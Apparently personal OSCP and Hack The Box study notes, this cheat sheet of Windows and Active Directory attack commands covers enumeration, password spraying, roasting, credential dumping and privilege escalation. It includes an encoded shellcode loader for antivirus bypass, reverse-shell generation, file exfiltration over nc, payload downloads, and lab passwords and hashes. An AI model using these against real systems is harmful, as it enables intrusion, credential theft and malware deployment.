- Windows:
	** Remember this: https://wadcoms.github.io/ 
	
	- 53 - DNS:
		- Enum:
			dig any manager.htb @10.10.11.236
			dig axfr @10.10.11.236 manager.htb
			
			dig A @10.10.11.236 manager.htb       #Regular DNS request
			dig AAAA @10.10.11.236 manager.htb    #IPv6 DNS request
			dig TXT @10.10.11.236 manager.htb     #Information
			dig MX @10.10.11.236 manager.htb      #Emails related
			dig NS @10.10.11.236 manager.htb
		
			dnsenum --dnsserver 10.10.10.248 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -o scans/dnsenum-bitquark-intelligence.htb 	intelligence.htb dnsenum VERSION:1.2.6
		- Add dns record:
			python3 dnstool.py -u intelligence\\Tiffany.Molina -p NewIntelligenceCorpUser9876 --action add --record web-0xdf --data 10.10.14.19 --type A intelligence.htb #==> https://0xdf.gitlab.io/2021/11/27/htb-intelligence.html
			
	- 80 - Web:
	- 88 - Kerberos:
		- Enum username:
			./kerbrute_linux_amd64 userenum -d manager.htb --dc dc01.manager.htb  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt #==> usernames
			impacket-GetUserSPNs -request -dc-ip 10.10.11.236 manager.htb/test111 
		- With credential:
			impacket-GetNPUsers -dc-ip 10.10.11.236 -request -outputfile getnpuser manager.htb/operator:operator # ==>No entries found!
			impacket-GetUserSPNs -request -dc-ip 10.10.11.236 manager.htb/operator:operator # ==>No entries found!
		- Bruce password:
			./kerbrute_linux_amd64 bruteuser -d manager.htb --dc dc01.manager.htb /usr/share/wordlists/rockyou.txt raven
	- 135 - RPC
		- Enum with null auth
			rpcclient -U "" -N 10.10.11.236 #No creds
				enumdomusers	#==> list users
				enumdomgroups	 #==> list users
			impacket-rpcdump 10.10.11.236
			rpcclient -U "" -N 10.10.11.236 #
			rpcclient -U "manager.htb/operator%operator" 10.10.11.236 #
	- 139,445 - smb:
		- Null auth, guess auth 
			crackmapexec smb 192.168.186.121 -u "" -p "" --shares
			crackmapexec smb manager.htb -u "test111" -p "" --shares
			
			smbmap -H 10.10.10.100 #==> active.htb 
			
			smbclient -N -L //10.10.10.248
		- With credential:
			crackmapexec smb 10.10.11.236 -u operator -p operator -d manager.htb --shares
			smbmap -H 10.10.10.248 -u 0xdf -p 0xdf #==> real or fake credential
			smbclient -U 'operator%operator' //manager.htb/SYSVOL
			smbclient -U 'relia.com\jim%Castello1!' -c 'mask "";recurse ON;prompt OFF;mget *' //192.168.232.248/transfer #==> Download all
		- Enum user
			enum4linux-ng -As dc01.manager.htb
			enum4linux-ng -w manager.htb -u operator -p operator --local-auth -As dc01.manager.htb
		- Bruce login
			for pass in $(cat ./users.txt);do crackmapexec smb 10.10.11.236 -u users.txt -p $pass -d manager.htb --continue-on-success; done
			crackmapexec smb 10.10.11.236 -u users.txt -p users.txt -d manager.htb --continue-on-success
	- 389,636,3268,3269 - Ldap
		- Enum
			ldapsearch -h 10.10.10.248 -x -s base namingcontexts #==> enum namingcontexts
		- Null auth
			ldapsearch -h 10.10.10.248 -x -b "DC=intelligence,DC=htb"
			ldapsearch -x -H ldap://10.10.11.236 -D '' -w '' -b "CN=USERS,DC=manager,DC=htb"
		- Anonymous auth
			ldapsearch -H ldaps://manage.htb:636 -x -s base -b '' "(objectClass=*)" "*" +
		- With credential
			ldapdomaindump 10.10.11.236 -u 'manager.htb\operator' -p 'operator' --no-json --no-grep -o ./
			ldapdomaindump 10.10.11.236 -u 'manager.htb\operator' -p 'operator' --no-html --no-grep --grouped-json -o ./
			
			ldapsearch -x -H ldap://10.10.11.236 -D 'operator' -w 'operator' -b "CN=Users,DC=manager,DC=htb" #==> not work
	- 1433 - Mssql
		- enum
			nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 manager.htb
			impacket-mssqlclient manager.htb/test111:@10.10.11.236
			impacket-mssqlclient -windows-auth -no-pass manager.htb/sa@10.10.11.236
		- bruce password:
			crackmapexec mssql 10.10.11.236 -u MANAGER -p /usr/share/wordlists/rockyou.txt --local-auth 
		- login
			impacket-mssqlclient -windows-auth manager.htb/operator:operator@10.10.11.236
		- steal ntlmv2(with cred)
		- directory list(with cred)
	- 5985 - Winrm
		- with credential
			crackmapexec winrm 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -d manager.htb
			evil-winrm -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -i 10.10.11.236


- WindowsPE:
	- 1st-step:
		- Bacic info
			systeminfo
			whoami /all
			net user
			net localgroup
			net groups
			netstat -ano
			cmd /c "echo %PATH%"
			ls C:\Windows\temp -force #==> alot maybe something nice just take a look
			
		- Advantage info
			Get-History
			cat $((Get-PSReadlineOption).HistorySavePath)
			Get-ChildItem -Path C:\Users\ -Include *.db, *.kdb,*.kdbx,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.log,*.bak,*.ps1 -File -Recurse -ErrorAction SilentlyContinue
			Get-ChildItem -Path C:\ -Include ntds.dit*,system* -File -Recurse -ErrorAction SilentlyContinue
			
		- List items:
			cmd /r dir /a-r-d /s /b c:\users #==> writeable 
			cmd /r dir /a-r /s /b c:\users #==> writeable folder
			
			./accesschk.exe -uwqs pov\sfitz c:\*.*
			more: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#write-permissions
			
		- Auto:
			powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended" 
			powershell -ep bypass -c ". .\PowerUp.ps1;Get-ModifiableServiceFile" #==> there are more
			winpeas		
		- File Tranfer:
			- Using nc:
				nc -l -p 1234 > winpeas.txt
				Get-Content out.txt | ./nc.exe -w 3 192.168.45.208 1234 #==> powershell
				./nc.exe -w 3 192.168.45.208 1234 < out.txt #==> other
			
			- Mount smb:				
				impacket-smbserver myshare ./ -smb2support -username user -password pass
				net use X: \\192.168.45.208\myshare
			

		- Seacrh file:
			where.exe /r C:\\windows eventvwr.exe
			dir -s logo.svg # ==>> seach file in current directory
			Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.log,*.bak -File -Recurse -ErrorAction SilentlyContinue
	- UAC bypass:
		- UACME(https://github.com/hfiref0x/UACME): 
			.\Akagi64.exe 33 "C:\Users\Peter Parker\Desktop\rev443.exe"
		- UAC-bypass(https://github.com/k4sth4/UAC-bypass): seem legit but not work yet
	- Technical:
		- AD CS: (Abuse certificate misconfiguration)
			- ESC 1	(authority.htb)
			- ESC 7 (manager.htb)
		
		
		
		- Token:
			- SeMachineAccountPrivilege #==>> add computer to AD
			- Seimpersonate #==>> Impersonate admin user
			- SeDebugPrivilege (pov.htb) #==> minikatz::debug | lasass | meterpreter::migrade | 
			- SeManageVolumePrivilege #==> Re-write ACL so normal user can read and write same as admin (but it not an admin)
			
		- FullPowers.exe (visual.htb)
		
			
	- Misc:
		- Writable Folder:
			cmd /r dir /a-r-d /s /b
		- Enable bypass Poweshell:
			Set-ExecutionPolicy Bypass -Scope process -Force
		- Enable RDP: (admin required)
			reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
			netsh advfirewall set allprofiles state off
			netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
		- Create user and add to admin-group:
			net user ns Password123! /add
			net localgroup administrators ns /add
			net localgroup administrators WEB_SVC /add
		- Runas other user:
			runas.exe /user:oscp.exam\celia.almeda 'powershell -ep bypass'
		
			./RunasCs.exe alaading f8gQ8fynP44ek1m3 "cmd /c whoami /all"
		
			$secpasswd = ConvertTo-SecureString "Password2" -AsPlainText -Force;
			$mycreds = New-Object System.Management.Automation.PSCredential ("testuser", $secpasswd);
			$computer = "computername"; <# or run with ip $computer = 192.168.139.129; #>
			[System.Diagnostics.Process]::Start("c:\windows\system32\calc.exe", "", $mycreds.Username, $mycreds.Password, $computer);
			
			Windows Management Instrumentation(WMI) + Windows Remote Shell(WinRs) secsion below
		- Inveigh:
			.\Inveigh.exe
			.\Inveigh.exe -ListenerIP 10.10.135.142 -SpooferIP 10.10.135.142 -SnifferIP 10.10.135.142
		
		- Chisel:
			./chisel64 server --port 8888 --reverse
			./chisel64.exe client 192.168.45.154:8888 R:socks
		- Evil-winrm:
			evil-winrm -u administrator -p December31 -i 192.168.245.153
		- Impacket:
			proxychains impacket-mssqlclient -windows-auth oscp.exam/celia.almeda:7k8XHk3dMtmpnC7@10.10.124.142
			
			impacket-secretsdump administrator:December31@192.168.201.153
			impacket-secretsdump  -hashes '3085cfe8000839658e86e8dab9017e78:3c4495bbd678fac8c9d218be4f2bbc7b' administrator@192.168.198.141
			
			
		- Crackmapexec:
			crackmapexec ldap -L # ==>> show options

			crackmapexec winrm 192.168.213.153 -u 'support' -p 'Freedom1' --local-auth --continue-on-success
			proxychains crackmapexec winrm 10.10.91.154 -u 'web_svc' -p 'Diamond1'
			crackmapexec ldap 10.10.111.146 -u 'WEB_SVC' -p 'Diamond1' --kdcHost 10.10.111.146 --users
			crackmapexec ldap 10.10.111.146 -u 'WEB_SVC' -p 'Diamond1' --kdcHost 10.10.111.146 --asreproast
		- Smbclient:
			proxychains smbclient -U 'web_svc%Diamond1' //10.10.91.152/Users
		- Hashcat:
			MS02$::OSCP:525B2787930B5DDD:0F1B9C354C76FFFB1D6677C6E23C8363:0101000000000000CF3397...00000000000000
			hashcat -m 5600 ntlmv2-hash /usr/share/wordlists/rockyou.txt --force
			
			$DCC2$10240#web_svc#130379745455ae62bbf41faa0572f6d3
			hashcat -m 2100 -a 0  dcc2hash /usr/share/wordlists/rockyou.txt --force
		
		- Ldapsearch:
			proxychains ldapsearch -x -H ldap://10.10.91.152 -D 'web_svc' -w 'Diamond1' -b "CN=USERS,DC=OSCP,DC=EXAM"
		
		- Bypass account logout: using ntlm
		
	- Token abusing:
		- Ref:
		https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/
		https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
		https://github.com/gtworek/Priv2Admin
		
		- SeBackupPrivilege:
			- Local:
				- Need: SAM + SYSTEM hives
				
				
			- DC:
				- Need: ntds.dit + SYSTEM hives
				
				
			- Ref:
				https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#priv-svc_backup--administrator #==> details
				https://medium0.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960
				
				
	- Relay-attack:
		impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..." 
		
		
	
	

- Methodology:
	- Do-not owning an account:
		- AS-Req Attack:
			- Kali:
				impacket-GetNPUsers -dc-ip 192.168.245.70 -request -outputfile hashes.asreproast corp.com # ==> ??? is this work ? => NO
																											=> with-out domain account user name have to be guest 
																											=> with domain account ldap it will qury ldap to get user name.
				impacket-GetNPUsers jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
				for user in $(cat users); do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.192 blackfield.local/$user | grep krb5asrep; done
				
				proxychains impacket-GetNPUsers -dc-ip 10.10.117.140 -request -outputfile getnpuser oscp.exam/celia.almeda:7k8XHk3dMtmpnC7
				
				hashcat -m 18200 ~/Desktop/getnpuser /usr/share/eaphammer/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
			- Windows:
				./Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat
				hashcat -m 18200 ~/Desktop/getnpuser /usr/share/eaphammer/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
				
	- Owning an account:
		- Kerberoasting:
			.\Rubeus.exe kerberoast /outfile:hashes.kerberoast ==>> windows
			proxychains impacket-GetUserSPNs -request -dc-ip 10.10.117.140 oscp.exam/celia.almeda:7k8XHk3dMtmpnC7 ==>> kali
			
			hashcat -m 18200 ~/Desktop/getnpuser /usr/share/eaphammer/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
		- Check local admin and domain admin:
			Find-LocalAdminAccess ==>> check current account is admin of which machine
		- Is LocalAdmin:
			- Mimikatz:
				./mimikazt
				privilege::debug
				sekurlsa::logonPasswords ==>> get all cached user hash
		- Is not LocalAdmin:
			- Seimpersonate: ??? work with non local admin ???
				./mimikastz
				token::elevate ==>> enable privilege and impersonate
				lsadump::sam ==>> dump ntlm
				
				reg save hklm\system c:\temp\system
				reg save hklm\sam c:\temp\sam
				lsadump::sam /system:c:\temp\system /sam:c:\temp\sam
			- SeMachineAccountPrivilege: ==>> can be abuse to PE
		
		- 
	- Owning other account:
		- Generic-All or Genaric-Write (full-per or change):
			- Attack other account: 
				- Change password: (on pwned-account powershell)
					$SecPassword = ConvertTo-SecureString 'LegmanTeamBenzoin!!' -AsPlainText -Force ==>> "LegmanTeamBenzoin!!" is new password for Other Account
					$Cred = New-Object System.Management.Automation.PSCredential('dc01\robert', $SecPassword) ==>> "dc01\robert" Other Account is robert
				- Enable "Do not require pre-authent" (AS-Rep roasing):
					//TODO


--------------------------------------------------------------------------------------------------------------------------------------------
- Genaral OSCP
	- Flag format OS{random-hash}.
	- Flag must be submitted before reverted or power-off machine because of dynamic generate flag.
	- The recommended way to ssh
	 ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@192.168.50.52
	- Discord: 
	  * Technical Service Team => technical issuse
	  * Learner Mentors => clarify items and hints of machine
	- VPN kali: 192.168.119.x | labs: 192.168.x.y (x=x)
	- PWK => testing technique | => methodology, approach, and attitude.
- Learning and reporting
	-
	
- Informationtion garthering(Enumeration)
	- 2 types: 
		- Active => big footprinting => not good
		- Passive => no or litter fooprinting => easy to out of date
	- Pentest stages : Define scope => information gather => initial foothold => PE => Lateral movement => Report => Lesson
	- PASSSIVE scan:
		- whois: whois megacorpone.com -h 192.168.50.251
				 whois 38.100.193.70 -h 192.168.50.251
				 
				 nslookup -type=TXT megacorptwo.com 192.168.192.151
		- google dork: site:megacorpone.com filename:"" filetype:"" intitle:"" intext:""
					   -filetype:"" => exclude 
		- git-*: 
			- search: owner:megacorpone path:*.user* 
			- gitleak:
			- gitrob:
		- shodan:
		- 
	- ACTIVE scan:
		- LOLBAS: 
		- dns: host www.megacorpone.com
			   host -t mx megacorpone.com
			   host -t txt megacorpone.com
			   for ip in $(cat list.txt); do host $ip.megacorpone.com; done
			   for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
			   dnsrecon -d megacorpone.com -t std
			   dnsrecon -d megacorpone.com -D ~/list.txt -t brt
			   dnsenum megacorpone.com
			   nslookup mail.megacorptwo.com
			   nslookup -type=TXT info.megacorptwo.com 192.168.50.151
			   nslookup -type=TXT megacorptwo.com 192.168.192.151
		- TCP/UDP scan: nc -nv -w 1 -z 192.168.50.152 3388-3390
						nc -nv -u -z -w 1 192.168.50.149 120-123
						1..65535 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.192.151", $_)) "TCP port $_ is open"} 2>$null
		- nmap:
		- SMTP: nc -nv 192.168.50.8 25
				telnet 192.168.50.8 25
				vrfy root
				EXPN ???
				Test-NetConnection -Port 25 192.168.50.8
				net view \\dc01 /all
		- SNMP: 
				sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt
				for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
				onesixtyone -i ips
				
				snmpwalk -c public -v1 -t 10 192.168.50.151
				snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25
													  1.3.6.1.2.1.25.1.6.0	System Processes
													  1.3.6.1.2.1.25.4.2.1.2	Running Programs
													  1.3.6.1.2.1.25.4.2.1.4	Processes Path
													  1.3.6.1.2.1.25.2.3.1.4	Storage Units
													  1.3.6.1.2.1.25.6.3.1.2	Software Name
													  1.3.6.1.4.1.77.1.2.25	User Accounts
													  1.3.6.1.2.1.6.13.1.3	TCP Local Ports

- Vulnerability Scanning:
	- NESUS:
	- Nmap-Script-Engine(NSE):
				cat /usr/share/nmap/scripts/script.db  | grep "\"vuln\"" (intrusive => sending payload to attack)
				sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
				google: CVE-2021-41773 nse 
					=> download 
					=> sudo nmap --script-updatedb 
					=> sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.50.124

- Buffer Over Flow:
	- Remark:
		- JMP ESP: instructs the program to jump to the stack and execute the shellcode that has been injected right after the beginning of the payload
		- Bad chracter: can be ASCII of UNICODE must be exclue from the payload because they may interpreted as control chacater 
						Ex: null-byte "\x00" is often interpreted as string terminator that will truncate our buffer. 
						Identifier 
						 
		- Payload: Create our own payload if possible.
				   There are exploits using custom payloads that are key to successfully compromising the vulnerable application. ==>> review first 
	
	- Genaral Flow of stack-base overflow: ==>> heap-base ???
		- Create large buffer to creates an overflow.
		- Take control of EIP by over writing the return address on the stack (padding large buffer with appropriate offset)
		- Include the choosen payload in the buffer and prepended by an optional NOP sled.
		- Choose the correct return address instruction such ad JMP ESP or other regigter to redirect the execution flow to the payload.
	- Hand-on flow: (https://github.com/cris-m/Buffer-Overflow-Exploit-Development/tree/main)
		- Fuzzing app to crash to find maximun character (https://github.com/cris-m/Buffer-Overflow-Exploit-Development/blob/main/assets/documentations/fuzzing.md)
		- Find offset => where is EIP (https://github.com/cris-m/Buffer-Overflow-Exploit-Development/blob/main/assets/documentations/offset.md)
		- Find bad chracter (https://github.com/cris-m/Buffer-Overflow-Exploit-Development/blob/main/assets/documentations/characters.md)
		- Find correct EIP ==>> not sure about this (https://github.com/cris-m/Buffer-Overflow-Exploit-Development/blob/main/assets/documentations/modules.md)
		- Create shell code (https://github.com/cris-m/Buffer-Overflow-Exploit-Development/blob/main/assets/documentations/shellcode.md)

- Anti-Virus Bypass:
	- Step:
		- Default payload:
			echo -n "JHNkYWZuaiA9ICcKW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBWaXJ0dWFsQWxsb2MoSW50UHRyIGxwQWRkcmVzcywgdWludCBkd1NpemUsIHVpbnQgZmxBbGxvY2F0aW9uVHlwZSwgdWludCBmbFByb3RlY3QpOwoKW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVUaHJlYWQoSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywgdWludCBkd1N0YWNrU2l6ZSwgSW50UHRyIGxwU3RhcnRBZGRyZXNzLCBJbnRQdHIgbHBQYXJhbWV0ZXIsIHVpbnQgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBUaHJlYWRJZCk7CgpbRGxsSW1wb3J0KCJtc3ZjcnQuZGxsIildCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBtZW1zZXQoSW50UHRyIGRlc3QsIHVpbnQgc3JjLCB1aW50IGNvdW50KTsnOwoKJHp4Y3p4Y2IgPSBBZGQtVHlwZSAtbWVtYmVyRGVmaW5pdGlvbiAkc2RhZm5qIC1OYW1lICJpV2luMzIiIC1uYW1lc3BhY2UgV2luMzJGdW5jdGlvbnMgLXBhc3N0aHJ1OwoKCltCeXRlW11dOwpbQnl0ZVtdXSAkaGpraHVpID0gMHhmYywweGU4LDB4ODIsMHgwLDB4MCwweDAsMHg2MCwweDg5LDB4ZTUsMHgzMSwweGMwLDB4NjQsMHg4YiwweDUwLDB4MzAsMHg4YiwweDUyLDB4YywweDhiLDB4NTIsMHgxNCwweDhiLDB4NzIsMHgyOCwweGYsMHhiNywweDRhLDB4MjYsMHgzMSwweGZmLDB4YWMsMHgzYywweDYxLDB4N2MsMHgyLDB4MmMsMHgyMCwweGMxLDB4Y2YsMHhkLDB4MSwweGM3LDB4ZTIsMHhmMiwweDUyLDB4NTcsMHg4YiwweDUyLDB4MTAsMHg4YiwweDRhLDB4M2MsMHg4YiwweDRjLDB4MTEsMHg3OCwweGUzLDB4NDgsMHgxLDB4ZDEsMHg1MSwweDhiLDB4NTksMHgyMCwweDEsMHhkMywweDhiLDB4NDksMHgxOCwweGUzLDB4M2EsMHg0OSwweDhiLDB4MzQsMHg4YiwweDEsMHhkNiwweDMxLDB4ZmYsMHhhYywweGMxLDB4Y2YsMHhkLDB4MSwweGM3LDB4MzgsMHhlMCwweDc1LDB4ZjYsMHgzLDB4N2QsMHhmOCwweDNiLDB4N2QsMHgyNCwweDc1LDB4ZTQsMHg1OCwweDhiLDB4NTgsMHgyNCwweDEsMHhkMywweDY2LDB4OGIsMHhjLDB4NGIsMHg4YiwweDU4LDB4MWMsMHgxLDB4ZDMsMHg4YiwweDQsMHg4YiwweDEsMHhkMCwweDg5LDB4NDQsMHgyNCwweDI0LDB4NWIsMHg1YiwweDYxLDB4NTksMHg1YSwweDUxLDB4ZmYsMHhlMCwweDVmLDB4NWYsMHg1YSwweDhiLDB4MTIsMHhlYiwweDhkLDB4NWQsMHg2OCwweDMzLDB4MzIsMHgwLDB4MCwweDY4LDB4NzcsMHg3MywweDMyLDB4NWYsMHg1NCwweDY4LDB4NGMsMHg3NywweDI2LDB4NywweGZmLDB4ZDUsMHhiOCwweDkwLDB4MSwweDAsMHgwLDB4MjksMHhjNCwweDU0LDB4NTAsMHg2OCwweDI5LDB4ODAsMHg2YiwweDAsMHhmZiwweGQ1LDB4NTAsMHg1MCwweDUwLDB4NTAsMHg0MCwweDUwLDB4NDAsMHg1MCwweDY4LDB4ZWEsMHhmLDB4ZGYsMHhlMCwweGZmLDB4ZDUsMHg5NywweDZhLDB4NSwweDY4LDB4YzAsMHhhOCwweDJkLDB4ZWMsMHg2OCwweDIsMHgwLDB4MWIsMHg4YSwweDg5LDB4ZTYsMHg2YSwweDEwLDB4NTYsMHg1NywweDY4LDB4OTksMHhhNSwweDc0LDB4NjEsMHhmZiwweGQ1LDB4ODUsMHhjMCwweDc0LDB4YywweGZmLDB4NGUsMHg4LDB4NzUsMHhlYywweDY4LDB4ZjAsMHhiNSwweGEyLDB4NTYsMHhmZiwweGQ1LDB4NjgsMHg2MywweDZkLDB4NjQsMHgwLDB4ODksMHhlMywweDU3LDB4NTcsMHg1NywweDMxLDB4ZjYsMHg2YSwweDEyLDB4NTksMHg1NiwweGUyLDB4ZmQsMHg2NiwweGM3LDB4NDQsMHgyNCwweDNjLDB4MSwweDEsMHg4ZCwweDQ0LDB4MjQsMHgxMCwweGM2LDB4MCwweDQ0LDB4NTQsMHg1MCwweDU2LDB4NTYsMHg1NiwweDQ2LDB4NTYsMHg0ZSwweDU2LDB4NTYsMHg1MywweDU2LDB4NjgsMHg3OSwweGNjLDB4M2YsMHg4NiwweGZmLDB4ZDUsMHg4OSwweGUwLDB4NGUsMHg1NiwweDQ2LDB4ZmYsMHgzMCwweDY4LDB4OCwweDg3LDB4MWQsMHg2MCwweGZmLDB4ZDUsMHhiYiwweGYwLDB4YjUsMHhhMiwweDU2LDB4NjgsMHhhNiwweDk1LDB4YmQsMHg5ZCwweGZmLDB4ZDUsMHgzYywweDYsMHg3YywweGEsMHg4MCwweGZiLDB4ZTAsMHg3NSwweDUsMHhiYiwweDQ3LDB4MTMsMHg3MiwweDZmLDB4NmEsMHgwLDB4NTMsMHhmZiwweGQ1OwoKCiR1aW9pa2hsID0gMHgxMDAwOwoKaWYgKCRoamtodWkuTGVuZ3RoIC1ndCAweDEwMDApIHskdWlvaWtobCA9ICRoamtodWkuTGVuZ3RofTsKCiRwb2l5dGN6ID0gJHp4Y3p4Y2I6OlZpcnR1YWxBbGxvYygwLCR1aW9pa2hsLDB4MzAwMCwweDQwKTsKCmZvciAoJGk9MDskaSAtbGUgKCRoamtodWkuTGVuZ3RoLTEpOyRpKyspIHskenhjenhjYjo6bWVtc2V0KFtJbnRQdHJdKCRwb2l5dGN6LlRvSW50MzIoKSskaSksICRoamtodWlbJGldLCAxKX07CgokenhjenhjYjo6Q3JlYXRlVGhyZWFkKDAsMCwkcG9peXRjeiwwLDAsMCk7Zm9yICg7OykgeyBTdGFydC1zbGVlcCA2MCB9Owo=" | base64 -d
		- Genarate revshell:
			msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.164 LPORT=7050 -f powershell -v sc ==>> change genatared payload to 
		- Open Power-shell x84: ==>> have to be x84
			C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
		- Change current user policy to run script (if AD GPOs not invoke):
			Get-ExecutionPolicy -Scope CurrentUser ==>> Undefined means can't run script.
			Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser ==>> Press [A] if prompt.
			Get-ExecutionPolicy -Scope CurrentUser ==>> This should be Unrestricted now.
		- Run script:
			./bypass.ps1


- Windows Privilege Escalation:
	- Basic:
		- SID-RID:
			S-1-0-0                       Nobody        
			S-1-1-0	                      Everybody
			S-1-5-11                      Authenticated Users
			S-1-5-18                      Local System
			S-1-5-domainidentifier-500    Administrator
		- Intigrity:
			- System: SYSTEM (kernel, ...)
			- High: Elevated users
			- Medium: Standard users
			- Low: Very restricted rights often used in sandboxed[^privesc_win_sandbox] processes or for directories storing temporary data
			- Untrusted: Lowest integrity level with extremely limited access rights for processes or objects that pose the most potential risk
	- Enumerating Windows:
		- Manual:
			- Username and hostname: 
				whoami
			- Group memberships of the current user: 
				whoami /groups
			- Existing users and groups:
				Get-LocalUser | Format-List *
				net user
				Get-LocalGroup | Format-List *
				Get-LocalGroupMember adminteam | Format-List *
			- Operating system, version and architecture:
				systeminfo
			- Network information:
				ipconfig /all
				route print
				netstat -ano
					-a all
					-n disable name solution
					-o show PID
			- Installed applications:
				Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname ==>> 32 applications
				ls 'C:\Program Files (x86)\'
				Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname ==>> 64 applications
				ls 'C:\Program Files\'
				Invoke-Command -cn wfe0, wfe1 -ScriptBlock {Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | select DisplayName, Publisher, InstallDate }
				Download folder, ....
			- Running processes:
				Get-Process
				Get-Process | Get-Process | Format-Table -View priority ==>> get all => detail all => priority 
				Get-Process winword, explorer | Format-List * ==>> show all
			- Search file:
				Get-ChildItem -Path C:\ -Include *.kdbx,*.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
				Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.log,*.bak -File -Recurse -ErrorAction SilentlyContinue
			- PS history and Transcripts:
				Get-History
				cat $((Get-PSReadlineOption).HistorySavePath)
		- Tool:
			- Winpeas:
				.\Winpeas.exe -log
			- Seatbelt:
				.\Seatbelt.exe -group=all ==> required .net 3.5
			- Jaw:
				.\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt ==> good schedule task looking
	- Leveraging Windows Services:
		- Windows service foundation:
			- User running service:
				- LocalSystem ==>> high-value local admin permission.
				- Network Service
				- Local Service
		- Service binary hijack:
			- Enum:
				- List running service:
					Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode | Where-Object {$_.State -like 'Running'}
					Get-Service |Where-Object {$_.Status -like 'running'}|Format-List
				- Check service binary permission:
					icacls "C:\xampp\apache\bin\httpd.exe"
					cmd /r dir /a /o /q "C:\xampp\apache\bin\httpd.exe" ==>> cmdlet on powershell
				- Check service status:
					Get-CIMInstance -Class Win32_Service -Filter "StartName='LocalSystem'" | Select-Object *|select name, StartName, PathName ==>> check service runner
					Get-CimInstance -ClassName win32_service | Select Name,StartMode| Where-Object {$_.Name -like 'mysql'} ==>> check auto start
				- Script:
					powershell -ep bypass -c ". .\PowerUp.ps1;Get-ModifiableServiceFile"
					powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
					
					
			- Manual-Attack:
				mv C:\xampp\mysql\bin\mysqld.exe C:\xampp\mysql\bin\mysqld1.exe
				iwr -uri http://192.168.45.167:8000/addnsadmin.exe -Outfile mysqld.exe
				cp C:\tools\mysqld.exe C:\xampp\mysql\bin\mysqld.exe
				
				Stop-Service BetaService
				restart-service BetaService
			- Auto-Attack:
				power-up
		- Service dll hijack:
			- Foundation:
				- DLL search order(DLL search mode enabled):
					1. The directory from which the application loaded.
					2. The system directory.
					3. The 16-bit system directory.
					4. The Windows directory. 
					5. The current directory.
					6. The directories that are listed in the PATH environment variable.
			- Enum:
				Get-CIMInstance -Class Win32_Service -Filter "StartName='LocalSystem'" | Select-Object *|select name, StartName ==>> check service runner
				Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}	
				Downloads app to vm and run Procmon to get dll
			- Manual-Attack:
				cd c:\users\dave\document ==>> same folder as service binary (1. The directory from which the application loaded.)
				iwr -uri http://192.168.45.167:8000/myDLL.dll -Outfile myDLL.dll
				restart-service BetaService
				
			- Auto-Attack:
				powerup ?
		- Unquote path:
			- Foundation:
			
			- Enum:
				wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """" ==>> cmdlet /i case-insensitive  /v not-macth
				Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
				icacls c:\ ==>> find path that writeable : W or F or M
			- Manual-Attack:
				Start-Service GammaService
			- Auto-Attack:
				powerup ?
	- Abusing Other Windows Components:
		- Scheduled Tasks:
			- Foundation:
